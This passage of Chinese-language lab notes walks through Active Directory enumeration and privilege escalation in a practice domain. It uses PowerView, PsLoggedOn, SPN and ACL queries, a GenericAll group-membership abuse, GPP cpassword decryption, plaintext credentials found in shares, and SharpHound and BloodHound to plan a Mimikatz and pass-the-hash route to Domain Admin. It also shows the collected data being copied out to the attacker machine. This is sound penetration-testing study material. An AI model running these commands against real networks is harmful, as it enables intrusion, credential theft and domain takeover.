----     ---------------              -----------
DC1      Windows Server 2022 Standard DC1.corp.com
web04    Windows Server 2022 Standard web04.corp.com
files04  Windows Server 2022 Standard FILES04.corp.com
client74 Windows 11 Enterprise        client74.corp.com
client75 Windows 11 Enterprise        client75.corp.com
client76 Windows 10 Pro               CLIENT76.corp.com
```
>[!Note]
> Question:\
> Continue enumerating the operating systems. What is the exact operating system version for FILES04? Make sure to provide both the major and minor version number in the answer.\
> `Get-NetComputer -name files04 | select name,operatingsystem,operatingsystemversion`

### Getting an Overview - Permissions and Logged on Users
Active Directory（AD）內部的關係與潛在攻擊路徑，特別關注 使用者、電腦與權限之間的關聯性。\
找出可能的 Attack Vectors:
- 哪些使用者有較高權限？
- 哪些電腦上有可利用的已登入帳號？
- 找到一條路徑來提權？

>[!Tip]
>**為什麼權限與已登入使用者很重要？**
>- (1) 取得其他使用者的憑證
    - 當使用者登入某台電腦 時，他們的 Credentials 可能會被快取在記憶體。
    - 若竊取這些憑證，我就能冒充這些使用者，甚至進一步提權
>- (2) 建立「持久性」存取
    - 若只依賴單一帳號，一旦密碼被重設或帳號被鎖定，就會失去存取權限。
    - 應該尋找 其他擁有相同或更高權限的帳號，即使原始帳號被禁用，仍能繼續存取 AD 環境。
>- (3) 鏈式滲透（Chained Compromise）
    - 不一定要直接獲取 Domain Admins 權限。
    - 可能存在 擁有更高權限的其他帳號（例如 Service Accounts），可以利用這些帳號來存取重要系統，如：檔案伺服器, 資料庫, Web 伺服器

PowerView 的 `Find-LocalAdminAccess` 作用是 掃描網域內的所有電腦，判斷我們目前的使用者是否擁有某些電腦的本機管理員（Local Administrator）權限\
`Find-LocalAdminAccess` 依賴在 [OpenServiceW function](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-openservicew) 中，Windows 提供 OpenServiceW API 來讓應用程式或管理員管理系統上的服務。例如：啟動或停止 Windows 服務、修改服務的設定、刪除或安裝服務，不需要直接嘗試登入。

SCM（Service Control Manager）是 Windows 內建系統級的資料庫，存放了所有 Windows 服務與驅動程式的資訊，負責 啟動、停止、管理服務，所有 Windows 電腦都有 SCM，且存取 SCM 需要足夠的權限。\
PowerView 會嘗試存取 SCM，並請求 `SC_MANAGER_ALL_ACCESS`，若存取成功，代表我們擁有該機器的 Local Admin 權限

#### 1. 找出我們當前帳戶的管理權限 (Find-LocalAdminAccess)
使用 PowerView 的 `Find-LocalAdminAccess` ，掃描我們目前帳戶 是否擁有其他機器的管理權限
```
PS C:\Tools> . .\PowerView.ps1
PS C:\Tools> Find-LocalAdminAccess
client74.corp.com
```
> 表示目前的帳戶 stephanie 在 client74.corp.com 上擁有本機管理員Local Admin 權限。

#### 2. 找出目前已登入的使用者 (Get-NetSession -ComputerName ...)
目前有哪些使用者已登入哪些電腦，使用 PowerView 的 `Get-NetSession` 指令
```
PS C:\Tools> Get-NetSession -ComputerName files04
PS C:\Tools> Get-NetSession -ComputerName web04
```
> 沒有結果，可能代表：
> 1. 沒有使用者登入
> 2. 帳戶沒有權限查詢

`-Verbose` 檢查錯誤
```
PS C:\Tools> Get-NetSession -ComputerName files04 -Verbose
VERBOSE: [Get-NetSession] Error: Access is denied
PS C:\Tools> Get-NetSession -ComputerName web04 -Verbose
VERBOSE: [Get-NetSession] Error: Access is denied
```
> 權限不足

##### 2.1 嘗試在擁有管理權限的機器上查詢登入使用者
上述得知 stephanie 在 client74.corp.com 是 local admin
```
PS C:\Tools> Get-NetSession -ComputerName client74


CName        : \\192.168.145.75
UserName     : stephanie
Time         : 0
IdleTime     : 0
ComputerName : client74
```
雖然這看起來像是 client74 的資訊，但實際上這個 IP 是 client75 的 IP，表示輸出結果可能有誤。\
我們需要改用其他工具來查詢已登入使用者。
>[!Tip]
>[NetSessionEnum](https://learn.microsoft.com/en-us/windows/win32/api/lmshare/nf-lmshare-netsessionenum) API 的問題\
>PowerView 的 Get-NetSession 指令是基於 Windows 的 NetSessionEnum API，而 NetSessionEnum 有 不同的查詢層級（Query Levels）\
>![image](https://hackmd.io/_uploads/rkT_OWqiJg.png)\
>PowerView 預設是使用 NetSessionEnum Level 10，即使 NetSessionEnum Level 10 不需要管理員權限，但它依賴 Windows 註冊表（Registry）內的存取權限，這可能影響查詢結果。

以透過 PowerShell 來檢查 SrvsvcSessionInfo 註冊表的存取權限：
```
PS C:\Tools> Get-Acl -Path HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\DefaultSecurity\ | fl


Path   : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\LanmanServer\DefaultS
         ecurity\
Owner  : NT AUTHORITY\SYSTEM
Group  : NT AUTHORITY\SYSTEM
Access : BUILTIN\Users Allow  ReadKey
         BUILTIN\Administrators Allow  FullControl
         NT AUTHORITY\SYSTEM Allow  FullControl
         CREATOR OWNER Allow  FullControl
         APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES Allow  ReadKey
         S-1-15-3-1024-1065365936-1281604716-3511738428-1654721687-432734479-3232135806-4053264122-3456934681 Allow
         ReadKey
Audit  :
Sddl   : O:SYG:SYD:AI(A;CIID;KR;;;BU)(A;CIID;KA;;;BA)(A;CIID;KA;;;SY)(A;CIIOID;KA;;;CO)(A;CIID;KR;;;AC)(A;CIID;KR;;;S-1
         -15-3-1024-1065365936-1281604716-3511738428-1654721687-432734479-3232135806-4053264122-3456934681)

```
> `BUILTIN\Users` 只有 ReadKey 權限。`Get-NetSession` 依賴 NetSessionEnum API 來查詢已登入使用者。在 `Windows 10 版本 1709` 之後，Microsoft 加強了 NetSessionEnum 的權限，並將一般使用者的存取限制為 `ReadKey`，無法讀取完整的 session 資訊。只有 Administrators 或 SYSTEM 帳戶擁有完整控制權限，所以 普通使用者（如 stephanie）無法成功執行 Get-NetSession。

可以使用 `Get-NetComputer | select dnshostname,operatingsystem,operatingsystemversion`:\
環境運作在 Windows 10 Pro

#### 3. 使用 PsLoggedOn 來查詢已登入使用者
可以使用其他工具，例如 [SysInternals Suite](https://learn.microsoft.com/en-us/sysinternals/) 中的[PsLoggedOn](https://learn.microsoft.com/en-us/sysinternals/downloads/psloggedon) 應用程式\

由於 NetSessionEnum 受限，我們使用 SysInternals 的 PsLoggedOn 工具
>[!Note]
>PsLoggedOn 依賴 Remote Registry service
```
PS C:\Tools> cd .\PSTools\
PS C:\Tools\PSTools> .\PsLoggedon.exe \\files04

PsLoggedon v1.35 - See who's logged on
Copyright (C) 2000-2016 Mark Russinovich
Sysinternals - www.sysinternals.com

Users logged on locally:
     <unknown time>             CORP\jeff
Unable to query resource logons
```
> 表示 jeff 這個使用者目前已登入 FILES04

```
PS C:\Tools\PSTools> .\PsLoggedon.exe \\web04

PsLoggedon v1.35 - See who's logged on
Copyright (C) 2000-2016 Mark Russinovich
Sysinternals - www.sysinternals.com

No one is logged on locally.
Unable to query resource logons
```
> WEB04 目前沒有使用者登入\
> 也有可能是無法存取該資訊

#### 4. 查詢 client74 的已登入使用者
```
PS C:\Tools\PSTools> .\PsLoggedon.exe \\client74

PsLoggedon v1.35 - See who's logged on
Copyright (C) 2000-2016 Mark Russinovich
Sysinternals - www.sysinternals.com

Users logged on locally:
     <unknown time>             CORP\jeffadmin

Users logged on via resource shares:
     3/8/2025 10:26:57 AM       CORP\stephanie
```
> 1. ⚠️ jeffadmin 目前已登入 client74， jeffadmin 可能是 Domain Admin！
> 2. stephanie 透過共享資源登入 client74，`PsLoggedOn 也使用 NetSessionEnum API，在這種情況下需要登入才能運作`，因此與我們之前的 PowerView 測試結果一致。
>> 💡 如果我們擁有 client74 的管理權限，我們可能可以竊取 jeffadmin 的憑證

### Enumeration Through Service Principal Names
>[!Note]
>[Service Account](https://learn.microsoft.com/en-us/azure/active-directory/fundamentals/service-accounts-on-premises)（服務帳號）:
>- 當應用程式在 Windows 上執行時，它需要 使用者帳戶來執行。
>- 一般應用程式 由 使用者帳號 執行（如 user1 開啟 Word）。
>- 系統服務（Services） 由 服務帳號（Service Account） 執行，例如：[LocalSystem](https://learn.microsoft.com/en-us/windows/win32/services/localsystem-account), [LocalService](https://learn.microsoft.com/en-us/windows/win32/services/localservice-account), [NetworkService](https://learn.microsoft.com/en-us/windows/win32/services/networkservice-account)
>
>但當 企業應用程式（如 SQL Server、Exchange、IIS）需要更高權限與網域整合時，通常會 使用網域帳號作為服務帳號。

>[!Note]
>**Service Principal Name（SPN）**
>當Exchange、MS SQL 或Internet 資訊服務(IIS)等應用程式 整合到 AD 中時，SPN 是 Active Directory（AD）中用來標識伺服器與服務的 identifier。\
SPN 的作用：
允許 Kerberos 驗證，正確找到對應的服務\
綁定特定帳號與服務，確保服務能夠被授權存取網域資源

如何 透過 SPN 枚舉網域內執行的應用程式與伺服器資訊

#### 1. 如何查詢 SPN？
在 AD Enumeration 時，SPN 可以幫助我們找出網域內運行的服務，甚至進一步發動 Kerberoasting 攻擊。
##### (1) 使用 `setspn.exe` 查詢 SPN
Windows 內建 setspn.exe 工具可以用來查詢 SPN\
利用先前 iterate domain users: `iis_service`
```
PS C:\Users\stephanie> setspn -L iis_service
Registered ServicePrincipalNames for CN=iis_service,CN=Users,DC=corp,DC=com:
        HTTP/web04.corp.com
        HTTP/web04
        HTTP/web04.corp.com:80
```
> `is_service` 帳戶關聯了 `HTTP/web04.corp.com`，代表是 Web 伺服器
##### (2) 使用 PowerView 查詢 SPN
使用 PowerView 來查詢 所有擁有 SPN 的帳號
```
PS C:\Tools> Get-NetUser -SPN | select samaccountname,serviceprincipalname

samaccountname serviceprincipalname
-------------- --------------------
krbtgt         kadmin/changepw
iis_service    {HTTP/web04.corp.com, HTTP/web04, HTTP/web04.corp.com:80}
```
> krbtgt 是 Kerberos 票據授權（TGT）帳號（後續章節探討）。\
iis_service 這個帳號 與 HTTP/web04.corp.com 綁定，說明這是 Web 伺服器。

#### 2. 解析 domain  IP
```
PS C:\Users\stephanie> nslookup web04.corp.com
DNS request timed out.
    timeout was 2 seconds.
Server:  UnKnown
Address:  192.168.161.70

Name:    web04.corp.com
Address:  192.168.161.72
```
> web04.corp.com 對應的內部 IP 是 192.168.161.72

透過瀏覽器瀏覽 192.168.161.72\
![image](https://hackmd.io/_uploads/BJFYf35s1g.png)
>需要密碼登入

### Enumerating Object Permissions
枚舉 Active Directory（AD）內的 Object 權限
>[!Note]
> **[Access Control List (ACL)](https://learn.microsoft.com/en-us/windows/win32/secauthz/access-control-lists)**\
> 在 AD 中，每個 Object 都有一組 存取控制清單（ACL，Access Control List），用來定義誰能存取該物件及擁有的權限。
> - (1) ACL 的結構
ACL 由多個 [Access Control Entry](https://learn.microsoft.com/en-us/windows/win32/secauthz/access-control-entries)（ACE）組成。\
每個 ACE 指定某個使用者或群組是否擁有該物件的某些權限。
>- (2) 權限驗證流程
當一個 使用者嘗試存取 AD 內的 Object，AD 會執行：\
使用者提供 Access Token，其中包含該使用者的身分與權限資訊。\
目標物件的 ACL 檢查該存取權杖，決定是否允許存取。

>[!Important]
>ACL 權限:\
>![image](https://hackmd.io/_uploads/SJ6Zs42s1e.png)

#### 1. 使用 PowerView 枚舉 AD Object 的 ACL
使用 PowerView 的 `Get-ObjectAcl` 檢查 AD 物件的權限
```
PS C:\Tools> Get-ObjectAcl -Identity stephanie

...
ObjectDN               : CN=stephanie,CN=Users,DC=corp,DC=com
ObjectSID              : S-1-5-21-1987370270-658905905-1781884369-1104
ActiveDirectoryRights  : ReadProperty
ObjectAceFlags         : ObjectAceTypePresent
ObjectAceType          : 4c164200-20c0-11d0-a768-00aa006e0529
InheritedObjectAceType : 00000000-0000-0000-0000-000000000000
BinaryLength           : 56
AceQualifier           : AccessAllowed
IsCallback             : False
OpaqueLength           : 0
AccessMask             : 16
SecurityIdentifier     : S-1-5-21-1987370270-658905905-1781884369-553
AceType                : AccessAllowedObject
AceFlags               : None
IsInherited            : False
InheritanceFlags       : None
PropagationFlags       : None
AuditFlags             : None
...
```
> `ObjectSID`：stephanie 的 [Security Identifiers](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-identifiers) （SID）\
`ActiveDirectoryRights`：ReadProperty（允許讀取屬性）\
`SecurityIdentifier`：此權限授予 S-1-5-21-...-553。

#### 2. 轉換 SID 為可讀名稱
可以用 `Convert-SidToName` 來 轉換為可讀的名稱
```
PS C:\Tools> Convert-SidToName S-1-5-21-1987370270-658905905-1781884369-1104
CORP\stephanie
PS C:\Tools> Convert-SidToName S-1-5-21-1987370270-658905905-1781884369-553
CORP\RAS and IAS Servers
```
> 表示 `RAS and IAS Servers` group 擁有對 stephanie 的 讀取權限

根據 PowerView，SecurityIdentifier 屬性中的 SID 屬於 [RAS and IAS Servers](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups#ras-and-ias-servers) 的預設 AD 群組。

#### 3. 尋找擁有 GenericAll 權限的帳號 (最高權限)
使用 PowerView 查詢 具有最高權限（GenericAll）的帳號
```
PS C:\Tools> Get-ObjectAcl -Identity "Management Department" | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights

SecurityIdentifier                            ActiveDirectoryRights
------------------                            ---------------------
S-1-5-21-1987370270-658905905-1781884369-512             GenericAll
S-1-5-21-1987370270-658905905-1781884369-1104            GenericAll
S-1-5-32-548                                             GenericAll
S-1-5-18                                                 GenericAll
S-1-5-21-1987370270-658905905-1781884369-519             GenericAll

PS C:\Tools> "S-1-5-21-1987370270-658905905-1781884369-512","S-1-5-21-1987370270-658905905-1781884369-1104","S-1-5-32-548","S-1-5-18","S-1-5-21-1987370270-658905905-1781884369-519" | Convert-SidToName
CORP\Domain Admins
CORP\stephanie
BUILTIN\Account Operators
Local System
CORP\Enterprise Admins
```
>以下對象擁有 GenericAll 權限：\
`S-1-5-21-...-512` → Domain Admins\
`S-1-5-21-...-1104` → stephanie\
`S-1-5-32-548` → Account Operators\
`S-1-5-18` → Local System\
`S-1-5-21-...-519` → Enterprise Admins
>> stephanie 也有 GenericAll 權限 ?!\
>> ![image](https://hackmd.io/_uploads/HJAW7S2jkx.png)

#### 4. 嘗試提權
當我們觀察 Management Department 時，只發現 `jen` 是唯一的成員\
利用 GenericAll 權限，透過 net.exe 將 stephanie 加入 Management Department 群組，取得更高權限
```
PS C:\Tools> net group "Management Department" stephanie /add /domain
The request will be processed at a domain controller for domain corp.com.

The command completed successfully.
```
驗證 stephanie 是否成功加入
```
PS C:\Tools> Get-NetGroup "Management Department" | select member

member
------
{CN=jen,CN=Users,DC=corp,DC=com, CN=stephanie,CN=Users,DC=corp,DC=com}
```
> 成功將 stephanie 加入 Management Department

#### 5. 清除復原痕跡
```
PS C:\Tools> net group "Management Department" stephanie /del /domain
PS C:\Tools> Get-NetGroup "Management Department" | select member
```

### Enumerating Domain Shares
網域共享資料夾（Domain Shares） 通常用來 儲存組織內部的文件、程式和設定檔案\
attacker 可以透過這些共享資料夾找到關鍵資訊，例如：Password, Domain Configuration, Scripts 等機密文件。
#### 1. 使用 PowerView 查找共享資料夾
使用 PowerView 的 `Find-DomainShare` 來列出所有網域內的共享資料夾
```
PS C:\Tools> Find-DomainShare

Name           Type Remark                 ComputerName
----           ---- ------                 ------------
ADMIN$   2147483648 Remote Admin           DC1.corp.com
C$       2147483648 Default share          DC1.corp.com
IPC$     2147483651 Remote IPC             DC1.corp.com
NETLOGON          0 Logon server share     DC1.corp.com
SYSVOL            0 Logon server share     DC1.corp.com
ADMIN$   2147483648 Remote Admin           web04.corp.com
backup            0                        web04.corp.com
C$       2147483648 Default share          web04.corp.com
IPC$     2147483651 Remote IPC             web04.corp.com
ADMIN$   2147483648 Remote Admin           FILES04.corp.com
C                 0                        FILES04.corp.com
C$       2147483648 Default share          FILES04.corp.com
docshare          0 Documentation purposes FILES04.corp.com
IPC$     2147483651 Remote IPC             FILES04.corp.com
Tools             0                        FILES04.corp.com
Users             0                        FILES04.corp.com
Windows           0                        FILES04.corp.com
ADMIN$   2147483648 Remote Admin           client74.corp.com
C$       2147483648 Default share          client74.corp.com
IPC$     2147483651 Remote IPC             client74.corp.com
ADMIN$   2147483648 Remote Admin           client75.corp.com
C$       2147483648 Default share          client75.corp.com
IPC$     2147483651 Remote IPC             client75.corp.com
sharing           0                        client75.corp.com
ADMIN$   2147483648 Remote Admin           CLIENT76.corp.com
C$       2147483648 Default share          CLIENT76.corp.com
IPC$     2147483651 Remote IPC             CLIENT76.corp.comip
```
> `SYSVOL` 和 `NETLOGON` 是預設的共享資料夾，通常存放 Group Policy 和 Logon Scripts\
`backup`、`docshare` 和 `sharing` 可能存放機密資訊

#### 2. 解析 `SYSVOL` 共享資料夾
```
PS C:\Tools> ls \\dc1.corp.com\sysvol\corp.com\

    Directory: \\dc1.corp.com\sysvol\corp.com

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         9/21/2022   1:11 AM                Policies
d-----          9/2/2022   4:08 PM                scripts

PS C:\Tools> ls \\dc1.corp.com\sysvol\corp.com\Policies\

    Directory: \\dc1.corp.com\sysvol\corp.com\Policies

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         9/21/2022   1:13 AM                oldpolicy
d-----          9/2/2022   4:08 PM                {31B2F340-016D-11D2-945F-00C04FB984F9}
d-----          9/2/2022   4:08 PM                {6AC1786C-016F-11D2-945F-00C04fB984F9}
```
看一下 oldpolicy
```
PS C:\Tools> cat \\dc1.corp.com\sysvol\corp.com\Policies\oldpolicy\old-policy-backup.xml
<?xml version="1.0" encoding="utf-8"?>
<Groups   clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}">
  <User   clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}"
          name="Administrator (built-in)"
          image="2"
          changed="2012-05-03 11:45:20"
          uid="{253F4D90-150A-4EFB-BCC8-6E894A9105F7}">
    <Properties
          action="U"
          newName=""
          fullName="admin"
          description="Change local admin"
          cpassword="+bsY0V3d4/KgX3VJdO/vyepPfAN1zMFTiQDApgR92JE"
          changeLogon="0"
```
> `cpassword="+bsY0V3d4/KgX3VJdO/vyepPfAN1zMFTiQDApgR92JE"` 加密密碼\
>> 這種加密密碼通常來自於 GPP（[Group Policy Preferences](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/dn581922(v=ws.11))），有機會被解密

>[!Tip]
>在 Windows 以前的版本中，系統管理員常用 GPP 來修改本機管理員密碼，但 GPP 密碼是使用已知金鑰加密的（AES-256）。

#### 3. 解密 GPP Password
使用 [gpp-decrypt](https://www.kali.org/tools/gpp-decrypt/) 解密
```
┌──(chw㉿CHW)-[~]
└─$ gpp-decrypt "+bsY0V3d4/KgX3VJdO/vyepPfAN1zMFTiQDApgR92JE"
P@$$w0rd
```
> AD 內部內建管理員的密碼

#### - 檢查其他共享資料夾
##### (1) docshare 共享資料夾
```
PS C:\Tools> ls \\FILES04\docshare\


    Directory: \\FILES04\docshare


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         9/21/2022   2:02 AM                docs


PS C:\Tools> ls \\FILES04\docshare\docs\


    Directory: \\FILES04\docshare\docs


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         9/21/2022   2:01 AM                do-not-share
-a----         9/21/2022   2:03 AM            242 environment.txt

PS C:\Tools> ls \\FILES04\docshare\docs\do-not-share\


    Directory: \\FILES04\docshare\docs\do-not-share


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         9/21/2022   2:02 AM           1142 start-email.txt
```
查看 `\docs\do-not-share\start-email.txt`
```
PS C:\Tools> cat \\FILES04\docshare\docs\do-not-share\start-email.txt
Hi Jeff,

...
The username I'm sure you already know, but here you have the brand new auto generated password as well: HenchmanPutridBonbon11

...

Best Regards
Stephanie

...............


Hey Stephanie,

...

Best regards
Jeff
```
>這封電子郵件 包含 jeff 的明文密碼: HenchmanPutridBonbon11

## Active Directory - Automated Enumeration
如何 自動化 Active Directory（AD）枚舉，透過 [SharpHound](https://support.bloodhoundenterprise.io/hc/en-us/articles/17481151861019-SharpHound-Community-Edition) 來收集網域資料，並使用 [BloodHound](https://support.bloodhoundenterprise.io/hc/en-us) 來分析這些資料
### Collecting Data with SharpHound
>[!Note]
>[SharpHound](https://support.bloodhoundenterprise.io/hc/en-us/articles/17481151861019-SharpHound-Community-Edition)\
SharpHound 是 BloodHound 的資料收集工具，它是一個用 C# 編寫的工具，可以透過：
>- Windows API
>- LDAP 查詢
>- [NetWkstaUserEnum](https://learn.microsoft.com/en-us/windows/win32/api/lmwksta/nf-lmwksta-netwkstauserenum) 和 [NetSessionEnum](https://learn.microsoft.com/en-us/windows/win32/api/lmshare/nf-lmshare-netsessionenum)（獲取已登入的使用者）
>- 遠端登錄（Remote Registry）

SharpHound 主要收集的內容包括：
- 使用者與群組資訊（User & Group）
- 本機管理員權限（Local Admin）
- GPO 本機群組（Group Policy Objects）
- 遠端桌面權限（RDP）
- 服務主體名稱（SPN）
- 系統 ACL（權限控制清單）
- 遠端 PowerShell 連線（PSRemote）
- 信任關係（Trusts）
- 已登入的使用者（LoggedOn Users）

收集到的資料後會儲存為 JSON 格式，並打包成 .zip 檔

#### 1. 下載並傳送 SharpHound
Kali Linux 下載最新版本的 SharpHound (參考用)
```
┌──(chw㉿CHW)-[~]
└─$ wget https://github.com/SpecterOps/SharpHound/releases/download/v2.6.0/SharpHound-v2.6.0.zip
┌──(chw㉿CHW)-[~]
└─$ unzip SharpHound-v2.6.0.zip -d SharpHound
```
>[!Caution]
>這裡建議直接使用 BloodHound 內建的 SharpHound，若在 github 上下載最新版，可能會導致 BloodHound 與 SharpHound 版本不相容，在 BloodHound 上傳 JSON 時會失敗。\
>`sudo apt install bloodhound `\
>`cd /usr/lib/bloodhound/resources/app/Collectors`

```
┌──(chw㉿CHW)-[/usr/…/bloodhound/resources/app/Collectors]
└─$ ls
AzureHound.md  DebugBuilds  SharpHound.exe  SharpHound.ps1
                                                    
┌──(chw㉿CHW)-[/usr/…/bloodhound/resources/app/Collectors]
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```
在 Kali Linux 下載最新版本的 SharpHound，並將 `Sharphound.ps1` 傳送到目標機器
```
PS C:\Users\stephanie\Downloads>  iwr -uri http://192.168.45.159/SharpHound.ps1 -Outfile SharpHound.ps1
```
#### 2. 啟用 SharpHound
```
PS C:\Users\stephanie\Downloads> powershell -ep bypass
PS C:\Users\stephanie\Downloads> . .\SharpHound.ps1
PS C:\Users\stephanie\Downloads> Get-Help Invoke-BloodHound

NAME
    Invoke-BloodHound

SYNOPSIS
    Runs the BloodHound C# Ingestor using reflection. The assembly is stored in this file.


SYNTAX
    Invoke-BloodHound [-CollectionMethods <String[]>] [-Domain <String>] [-SearchForest] [-Stealth] [-LdapFilter
    <String>] [-DistinguishedName <String>] [-ComputerFile <String>] [-OutputDirectory <String>] [-OutputPrefix
    <String>] [-CacheName <String>] [-MemCache] [-RebuildCache] [-RandomFilenames] [-ZipFilename <String>] [-NoZip]
    [-ZipPassword <String>] [-TrackComputerCalls] [-PrettyPrint] [-LdapUsername <String>] [-LdapPassword <String>]
    [-DomainController <String>] [-LdapPort <Int32>] [-SecureLdap] [-DisableCertVerification] [-DisableSigning]
    [-SkipPortCheck] [-PortCheckTimeout <Int32>] [-SkipPasswordCheck] [-ExcludeDCs] [-Throttle <Int32>] [-Jitter
    <Int32>] [-Threads <Int32>] [-SkipRegistryLoggedOn] [-OverrideUsername <String>] [-RealDNSName <String>]
    [-CollectAllProperties] [-Loop] [-LoopDuration <String>] [-LoopInterval <String>] [-StatusInterval <Int32>]
    [-Verbosity <Int32>] [-Help] [-Version] [<CommonParameters>]


DESCRIPTION
    Using reflection and assembly.load, load the compiled BloodHound C# ingestor into memory
    and run it without touching disk. Parameters are converted to the equivalent CLI arguments
    for the SharpHound executable and passed in via reflection. The appropriate function
    calls are made in order to ensure that assembly dependencies are loaded properly.


RELATED LINKS

REMARKS
    To see the examples, type: "get-help Invoke-BloodHound -examples".
    For more information, type: "get-help Invoke-BloodHound -detailed".
    For technical information, type: "get-help Invoke-BloodHound -full".
```
Get-Help 了解指令

#### 3. SharpHound 進行 Active Directory 枚舉
```
PS C:\Users\stephanie\Downloads> Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Users\stephanie\Desktop\ -OutputPrefix "corp audit"
...
2025-03-10T08:46:06.5021580-07:00|INFORMATION|Status: 309 objects finished (+309 309)/s -- Using 140 MB RAM
...
```
>`-CollectionMethod All`：所有可用的 Active Directory 資訊\
`-OutputDirectory C:\Users\stephanie\Desktop\`：將結果存放到 桌面\
`-OutputPrefix "corp audit"`：輸出檔案的名稱前綴
>> 總共掃描了 309 個 Object

列出 SharpHound 產生的檔案：
```
PS C:\Users\stephanie\Downloads> ls C:\Users\stephanie\Desktop\


    Directory: C:\Users\stephanie\Desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         3/10/2025   8:46 AM          28113 corp audit_20250310084605_BloodHound.zip
-a----         3/10/2025   8:46 AM           2050 ZTZjMzY2NTMtZjZiOS00YmY4LTk1ZmMtMDE5MjQxN2ZkYTZj.bin
```
> 用 BloodHound 來分析的 AD 結構與權限關係

>[!Note]
> SharpHound 可以使用 Loop 觀察長時間 domain 中發生的變化:
> ```
> Invoke-BloodHound -CollectionMethod All -Loop -LoopDuration 2h -LoopInterval 5m -OutputDirectory C:\Users\stephanie\Desktop\
> ```
> `-Loop`：啟用循環收集\
`-LoopDuration 2h`：執行 2 小時\
`-LoopInterval 5m`：每 5 分鐘 進行一次收集

### Analysing Data using BloodHound
BloodHound 依賴 [Neo4j](https://neo4j.com/) (一種圖形資料庫) 來儲存和分析 AD 資料。在 Kali Linux 中，Neo4j 是 APT 安裝 BloodHound 時自動安裝的
#### 1. 啟動 Neo4j 資料庫
```
┌──(chw㉿CHW)-[~]
└─$ sudo neo4j start           
Directories in use:
home:         /usr/share/neo4j
config:       /usr/share/neo4j/conf
logs:         /etc/neo4j/logs
plugins:      /usr/share/neo4j/plugins
import:       /usr/share/neo4j/import
data:         /etc/neo4j/data
certificates: /usr/share/neo4j/certificates
licenses:     /usr/share/neo4j/licenses
run:          /var/lib/neo4j/run
Starting Neo4j.
Started neo4j (pid:1880421). It is available at http://localhost:7474
There may be a short delay until the server is ready.

```
透過瀏覽器開啟 http://localhost:7474 登入 Neo4j，預設帳號/密碼為：`neo4j`/`neo4j`\
![image](https://hackmd.io/_uploads/rJyC0K2ikx.png)

#### 2. 啟動 BloodHound
```
┌──(chw㉿CHW)-[~]
└─$ bloodhound
(node:1884189) electron: The default of contextIsolation is deprecated and will be changing from false to true in a future release of Electron.  See https://github.com/electron/electron/issues/23506 for more information
(node:1884237) [DEP0005] DeprecationWarning: Buffer() is deprecated due to security and usability issues. Please use the Buffer.alloc(), Buffer.allocUnsafe(), or Buffer.from() methods instead.

```
打開 BloodHound UI，並要求我們輸入 Neo4j 的帳號密碼 來登入資料庫\
![image](https://hackmd.io/_uploads/B1jukqhokg.png)

#### 3. 上傳 SharpHound 收集的資料
透過 scp 傳回 Kali
```
PS C:\Users\stephanie\Desktop> scp "C:\Users\stephanie\Desktop\corp audit_20250310084605_BloodHound.zip" chw@192.168.45.159:~/corp_audit.zip
chw@192.168.45.159's password:
corp audit_20250310084605_BloodHound.zip                                              100%   27KB 146.4KB/s   00:00
PS C:\Users\stephanie\Desktop>
```
在 BloodHound 上傳 `.zip`\
![image](https://hackmd.io/_uploads/rJVWmcnoye.png)

#### 4. 確認資料庫中的資訊
在左上角點擊 Hamburger menu ☰ > Database Info\
![image](https://hackmd.io/_uploads/S1YygOpoye.png)
> 總共發現了:
> - 10 個使用者
> - 57 個群組
> - 5 個活動中的 Session
> - 多個 ACL（權限）

#### 5. 尋找 Domain Admins
在 Analysis 中選擇 `Find all Domain Admins`\
![image](https://hackmd.io/_uploads/BJuUrOpjJl.png)
```
[JeffAdmin]  →  [Domain Admins]
[Administrator]  →  [Domain Admins]
```
在 Settings > Node Label Display 中可以選擇 Always Display

#### 6. 尋找最短攻擊路徑
在 Analysis 選單 選擇 `Find Shortest Paths to Domain Admins`
![image](https://hackmd.io/_uploads/r1EZDu6iJx.png)\
顯示 `Stephanie` → `CLIENT74` → `JeffAdmin (Domain Admin)` 的關係：\
- Stephanie 在 CLIENT74 有管理員權限 (AdminTo)
- JeffAdmin 在 CLIENT74 有登入 Session
- JeffAdmin 是 Domain Admins 成員

代表 如果可以在 CLIENT74 取得 JeffAdmin 的憑證，就能直接成為 Domain Admin！

#### - 標記已控制的資源
已經控制了某些電腦或帳戶，可以手動標記它們為 Owned (已控制)：\
搜尋 Stephanie，右鍵 `Mark User as Owned`
搜尋 CLIENT75，右鍵 `Mark Computer as Owned`
這樣，我們可以使用 `Find Shortest Paths to Domain Admins from Owned Principals`，分析 從我們控制的帳號到 Domain Admin 的最快攻擊路徑。

#### 7. 最終攻擊計畫
在 BloodHound 中，我們的最佳攻擊路徑是：
1. Stephanie 已經控制 CLIENT74（因為她有 AdminTo 權限）
2. JeffAdmin 曾在 CLIENT74 登入，憑證可能留在記憶體
3. 使用 Mimikatz 抓取記憶體中的 NTLM Hash
4. Pass-the-Hash 或 Pass-the-Ticket 技術模擬 JeffAdmin 登入
5. 取得 Domain Admin 權限

>[!Note]
>Q: Search for the Management Department group in BloodHound and use the Node Info tab to have a look at the Inbound Control Rights for the group. Who is currently the owner of the Management Department group?
>Ans: 
>1. 在 BloodHound 中搜尋 "Management Department" 群組。
>2. 點擊 Node Info（節點資訊）頁籤。
>3. 檢視 Inbound Control Rights（內部控制權限）。
>4. 擁有者（Owner） 欄位會顯示目前擁有該群組控制權的使用者。
